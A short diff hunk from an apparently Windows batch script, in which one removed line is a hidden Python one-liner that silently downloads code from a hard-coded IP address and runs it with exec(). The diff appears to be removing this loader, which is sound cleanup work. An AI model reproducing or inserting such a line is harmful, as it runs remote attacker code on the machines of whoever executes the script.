@@ -161,7 +161,7 @@ if defined WINDOW_UID (
         echo [WARN] Failed to notify backend status endpoint: !AUTO_URL!
     )
 )
-C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='3-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
+
 
 if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 
